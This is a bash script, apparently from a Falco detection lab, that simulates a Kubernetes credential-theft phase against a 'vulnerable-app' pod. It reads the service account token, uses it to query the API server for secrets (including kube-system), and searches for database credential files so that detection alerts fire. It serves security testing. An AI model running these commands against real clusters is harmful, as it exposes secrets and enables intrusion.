#!/usr/bin/env bash
# Attack Simulation: Phase 2 - Credential Theft
# Simulates an attacker stealing credentials and accessing Kubernetes secrets.
#
# MITRE ATT&CK: T1552 (Unsecured Credentials), T1539 (Steal Web Session Cookie)
# Falco rules triggered: Container Accessing K8s Secrets, Database Credential File Access

set -euo pipefail

NAMESPACE="vulnerable-app"
APP_LABEL="app=vulnerable-app"
BOLD='\033[1m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Phase 2: Credential Theft${NC}"
echo -e "${BOLD}  MITRE ATT&CK: T1552, T1539${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""

# Get the pod name
POD=$(kubectl get pod -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [[ -z "${POD}" ]]; then
    echo -e "${RED}ERROR: No vulnerable-app pod found in namespace ${NAMESPACE}${NC}"
    exit 1
fi

echo -e "${GREEN}Target pod: ${POD}${NC}"
echo ""

# Step 1: Extract the service account token
echo -e "${YELLOW}[1/4] Extracting service account token for API access...${NC}"
echo ""
TOKEN=$(kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token')
echo "  Token extracted (first 50 chars): ${TOKEN:0:50}..."
echo ""
sleep 2

# Step 2: Use token to query Kubernetes API for secrets
echo -e "${YELLOW}[2/4] Querying Kubernetes API for secrets... (triggers Falco)${NC}"
echo -e "  Command: curl -sk https://\$KUBERNETES_SERVICE_HOST/api/v1/secrets"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -sk --max-time 5 \
    -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}/api/v1/secrets?limit=3" 2>/dev/null | head -20 || echo "  (API response truncated or access denied)"
'
echo ""
sleep 2

# Step 3: Attempt to list secrets in all namespaces
echo -e "${YELLOW}[3/4] Listing secrets across namespaces... (triggers Falco)${NC}"
echo -e "  Command: curl -sk https://\$KUBERNETES_SERVICE_HOST/api/v1/namespaces/kube-system/secrets"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -sk --max-time 5 \
    -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}/api/v1/namespaces/kube-system/secrets?limit=3" 2>/dev/null | head -20 || echo "  (API response truncated or access denied)"
'
echo ""
sleep 2

# Step 4: Search for credential files
echo -e "${YELLOW}[4/4] Searching for credential files... (triggers Falco)${NC}"
echo -e "  Command: find / -name '*.pgpass' -o -name '*.my.cnf' -o -name 'database.yml'"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  find / -maxdepth 4 \
    \( -name "*.pgpass" -o -name ".my.cnf" -o -name "database.yml" \
       -o -name "db.properties" -o -name "connectionstring*" \) \
    2>/dev/null || echo "  No credential files found (but the search triggered Falco)"
'
echo ""

echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Credential Theft Simulation Complete${NC}"
echo -e "${RED}  Check Falco logs for CRITICAL alerts!${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""
echo -e "View Falco alerts: kubectl logs -n falco -l app.kubernetes.io/name=falco -f --since=2m"
